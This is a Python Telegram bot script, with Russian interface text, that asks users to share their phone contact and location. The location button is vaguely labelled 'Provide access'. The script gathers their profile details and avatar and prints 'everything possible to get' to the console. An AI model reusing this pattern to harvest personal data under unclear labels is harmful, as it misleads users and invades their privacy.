import telebot
import confs
import json
from telebot import types

bot = telebot.TeleBot(confs.TOKEN)

@bot.message_handler(commands=['start'])
def start(message):
    keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True)
    
    btn1 = types.KeyboardButton(
        "📱 Предоставить профиль",
        request_contact=True,
    )

    btn2 = types.KeyboardButton(
        "📱 Предоставить доступ",
        request_location=True,
    )

    

    keyboard.add(btn1)
    keyboard.add(btn2)

    bot.send_message(
        message.chat.id,
        "Нажмите кнопку, чтобы отправить данные профиля:",
        reply_markup=keyboard
    )


@bot.message_handler(content_types=['contact', 'location', 'text'])
def handler(message):
    user = message.from_user

    # Получаем аватары (если есть)
    try:
        photos = bot.get_user_profile_photos(user.id, limit=1)
        avatar_file_id = photos.photos[0][0].file_id if photos.total_count > 0 else None
    except:
        avatar_file_id = None

    data = {
        "chat_id": message.chat.id,
        "user_id": user.id,
        "username": user.username,
        "first_name": user.first_name,
        "last_name": user.last_name,
        "language_code": user.language_code,
        "is_premium": user.is_premium,
        "phone_number": message.contact.phone_number if message.contact else None,
        "location": {
            "latitude": message.location.latitude if message.location else None,
            "longitude": message.location.longitude if message.location else None
        },
        "avatar_file_id": avatar_file_id,
    }

    # выводим ВСЁ, что возможно получить
    print("[USER DATA]", json.dumps(data, ensure_ascii=False, indent=4))

    bot.send_message(message.chat.id, "Данные успешно получены! 👍")


bot.polling(none_stop=True)
